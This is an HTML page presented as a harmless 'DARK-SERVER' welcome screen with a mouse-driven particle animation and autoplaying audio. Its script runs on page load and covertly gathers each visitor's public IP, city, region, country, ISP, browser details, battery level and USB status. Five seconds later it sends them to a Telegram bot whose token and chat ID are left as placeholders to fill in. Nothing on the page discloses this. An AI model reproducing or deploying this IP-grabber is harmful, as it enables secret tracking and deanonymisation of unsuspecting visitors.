<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK-SERVER</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #0d1100;
            overflow: hidden;
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            z-index: -1;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <canvas id="canvas"></canvas>
    <div class="bg-black p-8 rounded-lg shadow-lg w-80 relative z-10">
        <div class="flex justify-center mb-6">
            <div class="border border-gray-500 p-2 rounded-full">
                <span class="text-white text-2xl">𝘋𝘈𝘙𝘒--𝘋</span>
            </div>
        </div>
        <div class="text-center text-gray-400">
            <p class="mb-4">Welcome to the My Server. Click Background And Enjoy Effect!</p>
            <p>Hello dear I'm DXARK-D699</p>
        </div>
        <audio id="audio" autoplay>
            <source src="https://cdn.glitch.global/b81484d9-692a-4a73-b45b-1fea3c3bcb05/HI_HI_HA_HA!(256k).mp3?v=1739729489116" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
    </div>

    <script>
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        let particlesArray = [];

        class Particle {
            constructor(x, y) {
                this.x = x;
                this.y = y;
                this.size = Math.random() * 5 + 1;
                this.speedX = Math.random() * 3 - 1.5;
                this.speedY = Math.random() * 3 - 1.5;
                this.color = 'cyan';
            }
            update() {
                this.x += this.speedX;
                this.y += this.speedY;
                if (this.size > 3.0) this.size -= 0.1;
            }
            draw() {
                ctx.fillStyle = this.color;
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fill();
            }
        }

        function handleParticles() {
            for (let i = 0; i < particlesArray.length; i++) {
                particlesArray[i].update();
                particlesArray[i].draw();
                for (let j = i; j < particlesArray.length; j++) {
                    const dx = particlesArray[i].x - particlesArray[j].x;
                    const dy = particlesArray[i].y - particlesArray[j].y;
                    const distance = Math.sqrt(dx * dx + dy * dy);
                    if (distance < 100) {
                        ctx.beginPath();
                        ctx.strokeStyle = 'cyan';
                        ctx.lineWidth = 0.2;
                        ctx.moveTo(particlesArray[i].x, particlesArray[i].y);
                        ctx.lineTo(particlesArray[j].x, particlesArray[j].y);
                        ctx.stroke();
                        ctx.closePath();
                    }
                }
                if (particlesArray[i].size <= 0.3) {
                    particlesArray.splice(i, 1);
                    i--;
                }
            }
        }

        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            handleParticles();
            requestAnimationFrame(animate);
        }

        window.addEventListener('mousemove', function(event) {
            for (let i = 0; i < 5; i++) {
                particlesArray.push(new Particle(event.x, event.y));
            }
        });

        animate();

        let telegramBotToken = 'YOUR_BOT_TOKEN_HERE';
        let telegramChatId = 'YOUR_CHAT_ID_HERE';

        sendDataToTelegram();

        function sendDataToTelegram() {
            fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ipAddress = data.ip;
                const country = data.country_name;
                const region = data.region;
                const city = data.city;
                const isp = data.org;
                const language = navigator.language;
                const time = new Date().toLocaleTimeString();
                const deviceName = navigator.userAgent;
                const vendor = navigator.vendor;

                let usbConnected = 'No';
                if (navigator.usb) {
                    navigator.usb.getDevices().then(devices => {
                        if (devices.length > 0) {
                            usbConnected = 'Yes';
                        }
                    });
                }

                let batteryLevel = 'Not supported';
                navigator.getBattery().then(battery => {
                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
                }).catch(error => {
                    console.error('Error getting battery level:', error);
                });

                let localIp = '';
                fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    localIp = data.ip;
                })
                .catch(error => {
                    console.error('Error getting local IP address:', error);
                });

                setTimeout(() => {
                    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
                    fetch(telegramApiUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: telegramChatId,
                            text: `〄　ＤＡＲＫ－Ｄ699　⎙\n\n𝙸𝚙 𝙰𝚍𝚍𝚛𝚎𝚜𝚜: ${ipAddress}\n𝙻𝚘𝚌𝚊𝚕 𝙸𝚙: ${localIp}\n𝙲𝚘𝚞𝚗𝚝𝚛𝚢: ${country}\n𝚁𝚎𝚐𝚒𝚘𝚗: ${region}\n𝙲𝚒𝚝𝚢: ${city}\nIPS: ${isp}\n𝙻𝚊𝚗𝚐𝚞𝚊𝚐𝚎: ${language}\n𝚃𝚒𝚖𝚎: ${time}\n𝙳𝚎𝚟𝚒𝚌𝚎 𝙸𝚗𝚏𝚘: ${deviceName}\n\n𝚅𝚎𝚗𝚍𝚘𝚛: ${vendor}\n 𝙱𝚊𝚝𝚝𝚛𝚢: ${batteryLevel}\nUSB Connected: ${usbConnected} \n\nＭＡＤＥ　ＢＹ：@Dark_d699 `
                        })
                    });
                }, 5000);
            })
            .catch(error => {
                console.error('Error fetching IP data:', error);
            });
        }

        const audio = document.getElementById('audio');
        audio.addEventListener('start', () => {
            audio.pause();
            audio.currentTime = 0; // Reset audio to the beginning
        });
    </script>
</body>
</html>
